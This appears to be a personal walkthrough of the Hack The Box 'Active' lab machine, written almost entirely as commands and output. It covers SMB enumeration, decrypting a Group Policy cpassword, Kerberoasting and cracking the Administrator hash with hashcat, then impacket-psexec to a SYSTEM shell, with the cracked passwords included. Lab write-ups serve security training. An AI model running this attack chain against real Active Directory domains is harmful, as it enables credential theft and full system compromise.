@@ -1,0 +1,207 @@
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-21 02:10:51Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49165/tcp open  msrpc         Microsoft Windows RPC
+49166/tcp open  msrpc         Microsoft Windows RPC
+49167/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microso
+
+└─$ rpcclient -N active.htb -U ""
+
+rpcclient $> srvinfo
+	ACTIVE.HTB     Wk Sv PDC Tim NT     Domain Controller
+	platform_id     :	500
+	os version      :	6.1
+	server type     :	0x80102b
+rpcclient $> 
+
+
+//connect SMB
+└─$ smbclient -L 10.10.10.100 -N                                                          
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Replication     Disk      
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+
+[+] Attempting to map shares on 10.10.10.100
+
+//10.10.10.100/ADMIN$	Mapping: DENIED Listing: N/A Writing: N/A
+//10.10.10.100/C$	Mapping: DENIED Listing: N/A Writing: N/A
+//10.10.10.100/IPC$	Mapping: OK Listing: DENIED Writing: N/A
+//10.10.10.100/NETLOGON	Mapping: DENIED Listing: N/A Writing: N/A
+//10.10.10.100/Replication	Mapping: OK Listing: OK Writing: N/A
+//10.10.10.100/SYSVOL	Mapping: DENIED Listing: N/A Writing: N/A
+//10.10.10.100/Users	Mapping: DENIED Listing: N/A Writing: N/A
+
+└─$ smbclient //active.htb/Replication -U "%"
+Try "help" to get a list of possible commands.
+smb: \> 
+//or use smbclient //active.htb/Replication -N
+
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> more Groups.xml 
+
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
+</Groups>
+
+//it is cpassword, can be decrypted
+
+└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ          
+GPPstillStandingStrong2k18
+
+─$ smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18          
+
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[\] Checking for open ports...                                                                      [|] Checking for open ports...                                                                      [/] Checking for open ports...                                                                      [*] Detected 1 hosts serving SMB
+[-] Authenticating...                                                                               [\] Authenticating...                                                                               [|] Authenticating...                                                                               [/] Authenticating...                                                                               [-] Authenticating...                                                                               [\] Authenticating...                                                                               [|] Authenticating...                                                                               [/] Authenticating...                                                                               [-] Authenticating...                                                                               [\] Authenticating...                                                                               [|] Authenticating...                                                                               [*] Established 1 SMB connections(s) and 1 authenticated session(s)
+[/] Enumerating shares...                                                                           [-] Enumerating shares...                                                                           [\] Enumerating shares...                                                                           [|] Enumerating shares...                                                                           [/] Enumerating shares...                                                                           [-] Enumerating shares...                                                                           [\] Enumerating shares...                                                                           [|] Enumerating shares...                                                                           [/] Enumerating shares...                                                                           [-] Enumerating shares...                                                                                                                                                                               
+[+] IP: 10.10.10.100:445	Name: active.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	NO ACCESS	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	Replication                                       	READ ONLY	
+	SYSVOL                                            	READ ONLY	Logon server share 
+	Users                                             	READ ONLY
+
+└─$ netexec smb active.htb -u SVC_TGS -p GPPstillStandingStrong2k18  --shares
+SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+
+SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
+SMB         10.10.10.100    445    DC               [*] Enumerated shares
+SMB         10.10.10.100    445    DC               Share           Permissions     Remark
+SMB         10.10.10.100    445    DC               -----           -----------     ------
+SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
+SMB         10.10.10.100    445    DC               C$                              Default share
+SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
+SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share
+SMB         10.10.10.100    445    DC               Replication     READ            
+SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share
+SMB         10.10.10.100    445    DC               Users           READ 
+
+└─$ smbclient //active.htb/Users  --user=SVC_TGS --password=GPPstillStandingStrong2k18 
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                  DR        0  Sun Jul 22 00:39:20 2018
+  ..                                 DR        0  Sun Jul 22 00:39:20 2018
+  Administrator                       D        0  Mon Jul 16 20:14:21 2018
+  All Users                       DHSrn        0  Tue Jul 14 15:06:44 2009
+  Default                           DHR        0  Tue Jul 14 16:38:21 2009
+  Default User                    DHSrn        0  Tue Jul 14 15:06:44 2009
+  desktop.ini                       AHS      174  Tue Jul 14 14:57:55 2009
+  Public                             DR        0  Tue Jul 14 14:57:55 2009
+  SVC_TGS                             D        0  Sun Jul 22 01:16:32 2018
+
+
+smb: \SVC_TGS\Desktop\> more user.txt
+getting file \SVC_TGS\Desktop\user.txt of size 34 as /tmp/smbmore.e86OJT (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+
+881842494518601c59d8e2a0c3b691a6
+
+
+└─$ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 05:06:40.351723  2025-10-21 13:06:11.923769             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c74a9348c530e22bad5b34f5c8d5ac8c$ad41857e3f0ab1a0a9b819cb321ffd52236383548893324feb0e1e854f432d2561dd911b6f4218b0397be39fecead1f4b9a61903577a1de4bd107ea2c7809af59e631000a692921cd48f72fff9a2cd35316fd8f88c95d5f26e48813be4a4415afc9ea28baa324ab4e13050fd2b4d6f0e2c4de75ffc617776d25064aefa0fd61c3cb53ac7b357e3bda3d802bd1b6f1023fa282ff4cce8e6f3b9eceb442fd9c210bb883d8ad2e3786ad3b295e061ad18e6f1b2a18b129d7522cd78bfa6a15cb4b05dc7d484ffe8914be2eb900eb7f75e944fe7ef603b5b40e9e7715a73a040cf69e2675f6b0f806fb650bab9c7af5a44ad84dc224672fa2afd6459fd4bdb73bbc331ab0338b7f1e9d09657ff6648f8e9e8c9f9e9a1998d0881453de03a7eaead43e33625b8c9c8a1f8967d39441d63d991caf051547c75bb2df5e5ff7cec7a87d50d891550a02211dbb71a888c0798dc7ecf2f063b9594019c561881de264d31bff97be7972f1fc23260dc8993a8d6874313d164a6249ad173c734ff2ffaa38e5ddbe2be62a03ac5b83c261a8f5951175441a1fe29166fba280394cc5b7caf97c98c7a85200ba8a82d53a0380ddd097cbe9d3ac56b55721eccedc25d66b07b885f15bd9891c07df0d166fd8fabecef5894bc83fb721d5607f243dfc4b97913101378ba9955fa9ca60c6b569d9de34de600f17de01f68ebd81be2ede73138212d3fb19dd06bea409b782e1f58e939678975e425a6e3fa33d0bfb6316128c6112b1f13409c0f4479bca6313e8f10d0237ae0cbe6bab16222d664a9e375b0bd0de042d873e189df024f139e06d0fad9d67fe004cffaba627f6af850e560b129dcc1eff9109da11aeecfc6f259fa030988e01376f675bf8483b6b3ea043abeff898d9054741143cfeb6e3b1be36178fe247e309b96676b0206a769dfefefeb6762fba5d8f1ecdad0f6f58d06b11ac86ecd9bebba3c1b67f70b7b603da28b9093aece1bc63e7aee9cb2801b328e922dd32c8a6c3ccb2df3e5a1cdc8c3ffb699f4c6f60969ffb955e42575d2295845ece2f994b13e578f109f989276ac32d7d26010b1b83c8d43e78fb6b15d42147caeee8571f6fb1b27afc98bf7334a84b01d4e7c592e1ea27081baedec53f64c7e2534054f395a336ca1dee3a632487a3fd66cdbedc88244c864f2860619f888960d4e37a4025b9300916519e3bed638b021fcdb2c87e4a222943045046db420cbade108e92caaae470bb4cf5a567cf8
+
+└─$ hashcat -m 13100 hash ~/tools/rockyou.txt 
+
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c74a9348c530e22bad5b34f5c8d5ac8c$ad41857e3f0ab1a0a9b819cb321ffd52236383548893324feb0e1e854f432d2561dd911b6f4218b0397be39fecead1f4b9a61903577a1de4bd107ea2c7809af59e631000a692921cd48f72fff9a2cd35316fd8f88c95d5f26e48813be4a4415afc9ea28baa324ab4e13050fd2b4d6f0e2c4de75ffc617776d25064aefa0fd61c3cb53ac7b357e3bda3d802bd1b6f1023fa282ff4cce8e6f3b9eceb442fd9c210bb883d8ad2e3786ad3b295e061ad18e6f1b2a18b129d7522cd78bfa6a15cb4b05dc7d484ffe8914be2eb900eb7f75e944fe7ef603b5b40e9e7715a73a040cf69e2675f6b0f806fb650bab9c7af5a44ad84dc224672fa2afd6459fd4bdb73bbc331ab0338b7f1e9d09657ff6648f8e9e8c9f9e9a1998d0881453de03a7eaead43e33625b8c9c8a1f8967d39441d63d991caf051547c75bb2df5e5ff7cec7a87d50d891550a02211dbb71a888c0798dc7ecf2f063b9594019c561881de264d31bff97be7972f1fc23260dc8993a8d6874313d164a6249ad173c734ff2ffaa38e5ddbe2be62a03ac5b83c261a8f5951175441a1fe29166fba280394cc5b7caf97c98c7a85200ba8a82d53a0380ddd097cbe9d3ac56b55721eccedc25d66b07b885f15bd9891c07df0d166fd8fabecef5894bc83fb721d5607f243dfc4b97913101378ba9955fa9ca60c6b569d9de34de600f17de01f68ebd81be2ede73138212d3fb19dd06bea409b782e1f58e939678975e425a6e3fa33d0bfb6316128c6112b1f13409c0f4479bca6313e8f10d0237ae0cbe6bab16222d664a9e375b0bd0de042d873e189df024f139e06d0fad9d67fe004cffaba627f6af850e560b129dcc1eff9109da11aeecfc6f259fa030988e01376f675bf8483b6b3ea043abeff898d9054741143cfeb6e3b1be36178fe247e309b96676b0206a769dfefefeb6762fba5d8f1ecdad0f6f58d06b11ac86ecd9bebba3c1b67f70b7b603da28b9093aece1bc63e7aee9cb2801b328e922dd32c8a6c3ccb2df3e5a1cdc8c3ffb699f4c6f60969ffb955e42575d2295845ece2f994b13e578f109f989276ac32d7d26010b1b83c8d43e78fb6b15d42147caeee8571f6fb1b27afc98bf7334a84b01d4e7c592e1ea27081baedec53f64c7e2534054f395a336ca1dee3a632487a3fd66cdbedc88244c864f2860619f888960d4e37a4025b9300916519e3bed638b021fcdb2c87e4a222943045046db420cbade108e92caaae470bb4cf5a567cf8:Ticketmaster1968
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...567cf8
+Time.Started.....: Tue Oct 21 16:39:18 2025 (6 secs)
+Time.Estimated...: Tue Oct 21 16:39:24 2025 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/home/ed/tools/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1617.9 kH/s (0.44ms) @ Accel:256 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 10537984/14344385 (73.46%)
+Rejected.........: 0/10537984 (0.00%)
+Restore.Point....: 10536960/14344385 (73.46%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: Tiffany95 -> ThruJasonK21
+Hardware.Mon.#1..: Util: 71%
+
+Started: Tue Oct 21 16:39:17 2025
+Stopped: Tue Oct 21 16:39:26 2025
+
+Ticketmaster1968
+
+
+
+└─$ smbclient //active.htb/Users  --user=Administrator --password=Ticketmaster1968
+//to view the root.txt on the smb dir, or psexec to login to host
+
+└─$ impacket-psexec ACTIVE.HTB/Administrator@10.10.10.100
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Requesting shares on 10.10.10.100.....
+[*] Found writable share ADMIN$
+[*] Uploading file VFKKiCZY.exe
+[*] Opening SVCManager on 10.10.10.100.....
+[*] Creating service MQGo on 10.10.10.100.....
+[*] Starting service MQGo.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> cd C:\
+
+C:\> whoami
+nt authority\system
